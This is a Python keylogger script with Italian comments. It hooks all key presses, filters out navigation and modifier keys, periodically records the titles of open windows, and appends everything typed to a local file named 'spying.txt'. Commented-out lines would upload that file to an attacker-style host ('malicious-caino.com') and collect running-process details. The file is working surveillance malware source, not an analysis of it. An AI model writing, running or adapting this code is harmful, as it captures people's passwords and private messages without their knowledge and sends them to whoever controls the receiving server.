import keyboard
import pygetwindow as gw
import psutil
import requests
avoided_characters = ["delete","down","end","right arrow","down arrow","left arrow","up arrow",
"borrar","abajo","fin","flecha derecha","flecha abajo","flecha izquierda","flecha arriba",
"löschen","unten","ende","rechter Pfeil","unten Pfeil","linker Pfeil","oben Pfeil",
"apagar","baixo","fim","seta direita","seta para baixo","seta esquerda","seta para cima",
"删除","向下","结束","右箭头","下箭头","左箭头","上箭头",
"हटाएं","नीचे","समाप्त","दाएं तीर","नीचे की तीर","बाएं तीर","ऊपर की तीर",
"حذف","أسفل","النهاية","السهم الأيمن","السهم لأسفل","السهم الأيسر","السهم لأعلى"
"delete","shift","space","cancella","tab","f1","f2","f3","f4","f5","f6","f7","f8","f9","f10","f11","f11","f12","homepg","","supg","giù","fine","freccia destra","freccia giù","freccia sinistra","freccia su","ctrl (destra)","alt gr","alt","ctrl","bloc maiusc","maiusc","bloc maius","fn",'windows', 'right shift', 'left alt', 'shift', 'right ctrl', 'alt', 'right alt', 'left shift', 'right windows', 'left ctrl', 'left windows', 'ctrl', 'alt gr']
input_string = ""
counter = 0

def keylogging(e):
    global input_string
    global avoided_characters
    global counter
    if e.name == "enter":
        if counter == 1000:
            #url = 'http://malicious-caino.com/upload'
            #files = {'file': open('spying.txt', 'rb')}
            #response = requests.post(url, files=files)
            counter=0
        if counter % 10 == 0:
            input_string += "\n"
            window_list = gw.getAllTitles()


            input_string += str(window_list)
            input_string += "\n"
            #process_list = psutil.process_iter()

            # Stampare informazioni su ciascun processo
            #for process in process_list:
            #    print(process.name())
            #    input_string += process.name()
            #    input_string += str(process.pid)
            #    input_string += str(process.cpu_percent(interval=1.0))
            #    input_string += str(process.memory_info().rss / (1024 * 1024))
            #    input_string += "----------------"
            #input_string+="\n"
        input_string += "\n"
        with open('spying.txt', 'a') as file:
            file.write(input_string)
        counter += 1
    else:
        if e.name == "space":
            input_string+=" "
        if e.name == "backspace":
            input_string = input_string[:-1]
        else:
            if e.name not in avoided_characters:
                input_string += e.name  # Aggiunge il tasto premuto alla stringa

keyboard.on_press(keylogging)
# Mantieni il programma in esecuzione
keyboard.wait('ctrl+alt+del')
keyboard.unhook_all()
